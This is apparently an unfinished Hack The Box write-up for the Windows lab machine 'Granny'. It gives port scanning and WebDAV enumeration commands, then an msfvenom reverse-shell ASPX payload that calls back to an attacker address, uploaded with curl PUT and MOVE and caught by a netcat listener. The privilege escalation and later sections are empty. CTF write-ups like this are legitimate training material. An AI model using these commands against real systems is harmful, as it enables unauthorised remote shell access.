# Granny

**OS:** Windows

**Level:** Easy

**Links:** [1](https://www.hackthebox.com/machines/Granny)  [2](https://app.hackthebox.com/machines/Granny)

**Machine ip:** 10.10.10.15

![Granny](https://github.com/h4md153v63n/CTFs/assets/5091265/69e37688-dfcb-49cc-810a-ec81fec1581b)


## Reconnaissance
```
sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.15 -e tun0 > ports

ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')

sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.15 --open
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec0f4480-c9e2-4ca0-a2e8-0d68e25572cc)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/212f7ec1-e525-4478-9288-149a9f5e5ec4)


## Enumeration
Visit **http://10.10.10.15**.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6c195f8b-51e0-4e25-bb23-ac0b0deee900)

Directory fuzzing:

`gobuster dir -e -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.15/ -k -n -r -t 50`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a16434ff-a8b8-4fa4-98b3-ada15e1356a3)

The server is a IIS httpd 6.0 server, and it's using **WebDAV** extension:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/0c3e5ae0-216e-4315-a416-81bac7972e2d)

Check the allowed HTTP methods: `davtest --url http://10.10.10.15`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ed156ba0-61f4-4c6b-b74a-0d1eb796979b)


## Exploitation & Gaining Access

### Method 1: 
Generate a reverse shell with msfvenom:

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.24 LPORT=4444 -f aspx > shell.aspx

mv shell.aspx shell.txt
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/03d4a892-0847-4152-9540-70b82ce26b5f)

Upload it using curl with PUT method, and rename it back to the original file type aspx using curl with MOVE option:

```
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.txt

curl -X MOVE --header 'Destination:http://10.10.10.15/shell.aspx' 'http://10.10.10.15/shell.txt' 
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b2ef3cc0-7d3c-41b9-aa22-768d296ff1a6)

```
# Start netcat listener:
nc -nvlp 4444

# Trigger the revershell using curl, or opening on the browser:
curl http://10.10.10.15/shell.aspx
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3a072777-cb2a-4d6d-b136-0577b7f52fb0)

We got the shell, and there's no privilege to read user.txt flag.


## Privilege Escalation

### Method 1: 



# References & Alternatives
+ x


## CVE Scripting
+ x


## Tools
+ x


## Technical Knowledge
+ x


## Problems Solution
+ x


## For More
+ x
